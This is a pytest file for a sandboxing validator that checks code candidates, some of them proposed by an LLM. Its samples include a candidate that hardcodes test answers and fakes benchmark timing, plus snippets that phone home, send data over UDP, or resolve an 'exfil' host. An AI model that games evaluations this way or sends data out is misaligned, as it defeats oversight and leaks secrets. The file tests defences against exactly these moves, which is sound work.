"""Tests for the gauntlet validator."""

import pytest

from sis import gauntlet
from sis.paths import OPTIMISED_CANDIDATE_PATH, TARGET_PATH

_GOOD_CODE = OPTIMISED_CANDIDATE_PATH.read_text(encoding="utf-8")
_BASELINE = 0.05  # advisory baseline (decision now uses an in-sandbox measurement)

# A candidate that hardcodes exactly the inputs the static pytest suite checks
# (and the old fixed benchmark input) but returns garbage everywhere else.
# It PASSES mypy + pytest, so only the differential-correctness gate can catch it.
_GAMING_CODE = '''
import time

_KNOWN = {1: 1, 6: 12, 12: 28, 28: 56, 7: 8, 13: 14, 496: 992, 8128: 16256}


def sum_of_divisors(n: int) -> int:
    return _KNOWN.get(n, 0)


def benchmark(n: int = 10_000, repetitions: int = 5) -> float:
    return 1e-9  # pretends to be blazing fast
'''


def test_good_code_passes() -> None:
    result = gauntlet.validate(_GOOD_CODE, _BASELINE)
    assert result.passed, f"Expected pass, got: {result.reason}\n{result.errors}"
    assert result.latency_seconds is not None
    assert result.latency_seconds < _BASELINE


def test_syntax_error_fails() -> None:
    result = gauntlet.validate("def foo(: pass", 1.0)
    assert not result.passed
    assert "SyntaxError" in result.reason


def test_identical_candidate_rejected_as_noop() -> None:
    # M3 regression: a candidate byte-identical to the baseline is a no-op —
    # rejected before the benchmark, where at the µs floor the ≥10% margin is
    # pure timing noise. (The stub re-proposes identical code once its own
    # optimisation has merged; that must not open a no-op PR.)
    fast = OPTIMISED_CANDIDATE_PATH.read_text(encoding="utf-8")
    result = gauntlet.validate(fast, _BASELINE, baseline_source=fast)
    assert not result.passed
    assert "no change" in result.reason


def test_validate_benchmarks_against_provided_baseline() -> None:
    # H1 regression: the candidate must be benchmarked against the baseline the
    # caller supplies (the merged target), not the local runtime/target.py. A
    # naive O(n) candidate measured against an O(√n) baseline_source is reliably
    # ~100× slower → rejected as "no improvement". If validate fell back to the
    # (also naive) local file, naive-vs-naive would be a coin-flip instead.
    naive = TARGET_PATH.read_text(encoding="utf-8")
    fast_baseline = OPTIMISED_CANDIDATE_PATH.read_text(encoding="utf-8")
    result = gauntlet.validate(naive, _BASELINE, baseline_source=fast_baseline)
    assert not result.passed
    assert "no improvement" in result.reason


def test_improvement_over_provided_baseline_passes() -> None:
    # The optimised candidate beats an explicit naive baseline_source and passes.
    naive = TARGET_PATH.read_text(encoding="utf-8")
    fast = OPTIMISED_CANDIDATE_PATH.read_text(encoding="utf-8")
    result = gauntlet.validate(fast, _BASELINE, baseline_source=naive)
    assert result.passed, f"Expected pass, got: {result.reason}\n{result.errors}"


def test_benchmark_gaming_is_rejected() -> None:
    # Passes mypy + the static pytest cases, but disagrees with the reference
    # on randomised inputs → must be caught by differential correctness.
    result = gauntlet.validate(_GAMING_CODE, _BASELINE)
    assert not result.passed
    assert "correctness mismatch" in result.reason


_NETWORK_CODE = '''
import socket


def sum_of_divisors(n: int) -> int:
    socket.create_connection(("example.com", 80))  # try to phone home
    return n


def benchmark(n: int = 10_000, repetitions: int = 5) -> float:
    return 1e-9
'''


def test_measure_baseline_runs_in_sandbox() -> None:
    # The committed target benchmarks to a positive latency, measured in the
    # gauntlet sandbox — never exec'd in this (main) process.
    b = gauntlet.measure_baseline()
    assert isinstance(b, float) and b > 0


def test_measure_baseline_unmeasurable_returns_zero(capsys) -> None:  # type: ignore[no-untyped-def]
    # Source lacking sum_of_divisors → advisory 0.0, not a crash — but it must
    # say so loudly rather than silently feeding a bogus number downstream (L7).
    assert gauntlet.measure_baseline("x = 1\n") == 0.0
    assert "measure_baseline" in capsys.readouterr().err


def test_sandbox_env_scrubs_credentials(monkeypatch) -> None:  # type: ignore[no-untyped-def]
    from sis.gauntlet import _sandbox_env

    monkeypatch.setenv("SIS_ATLASSIAN_API_TOKEN", "secret")
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "secret")
    monkeypatch.setenv("GITHUB_TOKEN", "secret")
    env = _sandbox_env(home="/tmp/x", pythonpath="/tmp/x")
    assert "SIS_ATLASSIAN_API_TOKEN" not in env
    assert "AWS_SECRET_ACCESS_KEY" not in env
    assert "GITHUB_TOKEN" not in env
    assert env["PATH"]  # still runnable


def test_docker_args_are_locked_down() -> None:
    from sis.gauntlet import _docker_args

    args = _docker_args("/tmp/sandbox123", {"PYTHONPATH": "/tmp/sandbox123",
                                            "PATH": "/usr/bin"}, "sis-gauntlet:latest",
                        "sis-gauntlet-abc123")
    joined = " ".join(args)
    assert "--network none" in joined            # no egress
    assert "--cap-drop ALL" in joined            # no capabilities
    assert "no-new-privileges" in joined
    assert "--read-only" in joined               # immutable rootfs
    assert "--name sis-gauntlet-abc123" in joined   # killable by name on timeout
    assert "--memory" in joined and "--cpus" in joined  # bounded resources
    assert "-v /tmp/sandbox123:/tmp/sandbox123:rw" in joined  # only the temp dir
    assert args[-1] == "sis-gauntlet:latest"
    # PATH is left to the image; PYTHONPATH is forwarded for sitecustomize.
    assert "-e PYTHONPATH=/tmp/sandbox123" in joined
    assert "-e PATH=" not in joined


def test_docker_args_forward_no_host_credentials() -> None:
    from sis.gauntlet import _docker_args

    # Only the scrubbed env keys are forwarded — a stray token must not appear.
    env = {"PYTHONPATH": "/t", "HOME": "/t"}  # what _sandbox_env produces
    joined = " ".join(_docker_args("/t", env, "img", "sis-gauntlet-x"))
    assert "TOKEN" not in joined and "SECRET" not in joined and "KEY" not in joined


def test_docker_timeout_kills_the_container(monkeypatch) -> None:  # type: ignore[no-untyped-def]
    # M1 regression: a SIGKILL to `docker run` leaves the container running, so
    # on timeout the gauntlet must `docker kill` it by name — otherwise an
    # infinite-loop candidate burns host CPU forever. Mocked: no real daemon.
    import subprocess

    from sis import gauntlet

    monkeypatch.setenv("SIS_SANDBOX", "docker")
    monkeypatch.setenv("SIS_GAUNTLET_TIMEOUT", "1")

    calls: list[list[str]] = []

    def fake_run(
        cmd: list[str], *args: object, **kwargs: object
    ) -> subprocess.CompletedProcess[str]:
        calls.append(cmd)
        if cmd[:2] == ["docker", "run"]:
            raise subprocess.TimeoutExpired(cmd, 1)  # candidate never terminates
        return subprocess.CompletedProcess(cmd, 0, "", "")  # the docker kill

    monkeypatch.setattr(gauntlet.subprocess, "run", fake_run)

    result = gauntlet._run([gauntlet._PY, "-c", "pass"], "/tmp/x", {"PYTHONPATH": "/tmp/x"})

    assert result.returncode == 124 and "timed out" in result.stderr
    run_cmd = next(c for c in calls if c[:2] == ["docker", "run"])
    name = run_cmd[run_cmd.index("--name") + 1]
    assert ["docker", "kill", name] in calls  # the leaked container was stopped


def test_network_egress_is_blocked() -> None:
    # A candidate that tries to open a connection is stopped by the sandbox.
    result = gauntlet.validate(_NETWORK_CODE, _BASELINE)
    assert not result.passed
    assert any("network egress blocked" in line for line in result.errors)


_UDP_CODE = '''
import socket


def sum_of_divisors(n: int) -> int:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(b"leak", ("8.8.8.8", 53))  # UDP needs no connect() — L13 gap
    return n


def benchmark(n: int = 10_000, repetitions: int = 5) -> float:
    return 1e-9
'''

_DNS_CODE = '''
import socket


def sum_of_divisors(n: int) -> int:
    socket.getaddrinfo("exfil.example.com", 80)  # DNS is egress too — L13 gap
    return n


def benchmark(n: int = 10_000, repetitions: int = 5) -> float:
    return 1e-9
'''


def test_udp_egress_is_blocked() -> None:
    # L13: UDP sendto (no connect) must be blocked by the soft sandbox too.
    result = gauntlet.validate(_UDP_CODE, _BASELINE)
    assert not result.passed
    assert any("network egress blocked" in line for line in result.errors)


def test_dns_resolution_is_blocked() -> None:
    # L13: getaddrinfo (DNS) is egress and a data-exfil channel — also blocked.
    result = gauntlet.validate(_DNS_CODE, _BASELINE)
    assert not result.passed
    assert any("network egress blocked" in line for line in result.errors)


def test_mypy_failure_fails() -> None:
    bad_typed = "def sum_of_divisors(n): return n\ndef benchmark(n=1,repetitions=1): return 0.0\n"
    result = gauntlet.validate(bad_typed, 1.0)
    assert not result.passed
    assert "mypy" in result.reason


def test_missing_target_tests_blame_the_harness_not_the_candidate(monkeypatch, tmp_path) -> None:  # type: ignore[no-untyped-def]
    # Regression (2026-07-28 minor list): with tests/test_target.py absent, the
    # gate fell through to `pytest <a directory that was never created>`, which
    # exits non-zero and was reported as "pytest failed" — a perfectly good
    # candidate rejected with a reason pointing at the wrong side of the fence.
    # Must still fail closed (a correctness gate that did not run is not a pass)
    # but name the harness as the cause.
    monkeypatch.setattr(gauntlet, "TARGET_TEST_PATH", tmp_path / "test_target.py")
    result = gauntlet.validate(_GOOD_CODE, _BASELINE)
    assert not result.passed
    assert result.reason.startswith("harness:")
    assert "pytest failed" not in result.reason


def test_stub_proposer_allows_subprocess_sandbox(monkeypatch) -> None:  # type: ignore[no-untyped-def]
    # The stub returns a trusted, hand-written candidate → soft sandbox is fine.
    monkeypatch.setenv("SIS_PROPOSER", "stub")
    monkeypatch.delenv("SIS_SANDBOX", raising=False)
    gauntlet.ensure_sandbox_allows_proposer()  # must not raise


def test_llm_proposer_requires_docker_sandbox(monkeypatch) -> None:  # type: ignore[no-untyped-def]
    # M1 regression: untrusted LLM code must not run in the soft subprocess
    # sandbox, where it can read host files like secrets.local.yml.
    monkeypatch.setenv("SIS_PROPOSER", "claude")
    monkeypatch.delenv("SIS_SANDBOX", raising=False)  # subprocess (default)
    monkeypatch.delenv("SIS_ALLOW_UNSANDBOXED_LLM", raising=False)
    with pytest.raises(RuntimeError, match="docker sandbox"):
        gauntlet.ensure_sandbox_allows_proposer()


def test_llm_proposer_ok_in_docker_sandbox(monkeypatch) -> None:  # type: ignore[no-untyped-def]
    monkeypatch.setenv("SIS_PROPOSER", "claude")
    monkeypatch.setenv("SIS_SANDBOX", "docker")
    gauntlet.ensure_sandbox_allows_proposer()  # must not raise


def test_unsandboxed_llm_override_warns_but_allows(monkeypatch, capsys) -> None:  # type: ignore[no-untyped-def]
    monkeypatch.setenv("SIS_PROPOSER", "claude")
    monkeypatch.delenv("SIS_SANDBOX", raising=False)
    monkeypatch.setenv("SIS_ALLOW_UNSANDBOXED_LLM", "1")
    gauntlet.ensure_sandbox_allows_proposer()  # allowed under explicit override
    assert "untrusted" in capsys.readouterr().err.lower()  # ...but loudly


def test_validate_refuses_llm_without_docker(monkeypatch) -> None:  # type: ignore[no-untyped-def]
    # The backstop: validate() itself refuses to run untrusted code unsandboxed,
    # so no caller can bypass the guard.
    monkeypatch.setenv("SIS_PROPOSER", "claude")
    monkeypatch.delenv("SIS_SANDBOX", raising=False)
    monkeypatch.delenv("SIS_ALLOW_UNSANDBOXED_LLM", raising=False)
    with pytest.raises(RuntimeError, match="docker sandbox"):
        gauntlet.validate(_GOOD_CODE, _BASELINE)
